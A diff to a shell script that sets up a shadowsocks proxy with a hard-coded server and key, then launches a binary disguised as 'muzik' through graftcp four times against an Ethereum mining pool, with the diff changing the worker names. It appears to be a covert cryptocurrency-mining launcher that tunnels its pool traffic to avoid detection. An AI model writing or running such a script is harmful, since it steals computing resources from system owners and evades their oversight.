@@ -45,13 +45,13 @@ apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./muzik -P stratum://prodent.ava@eth.global.luxor.tech:700
+./graftcp/graftcp ./muzik -P stratum+tcp://prodent.1@eth.global.luxor.tech:700
 
 sleep 2
-./graftcp/graftcp ./muzik -P stratum://prodent.ava@eth.global.luxor.tech:700
+./graftcp/graftcp ./muzik -P stratum+tcp://prodent.2@eth.global.luxor.tech:700
 
 sleep 2
-./graftcp/graftcp ./muzik -P stratum://prodent.ava@eth.global.luxor.tech:700
+./graftcp/graftcp ./muzik -P stratum+tcp://prodent.3@eth.global.luxor.tech:700
 
 sleep 2
-./graftcp/graftcp ./muzik -P stratum://prodent.ava@eth.global.luxor.tech:700
+./graftcp/graftcp ./muzik -P stratum+tcp://prodent.4@eth.global.luxor.tech:700
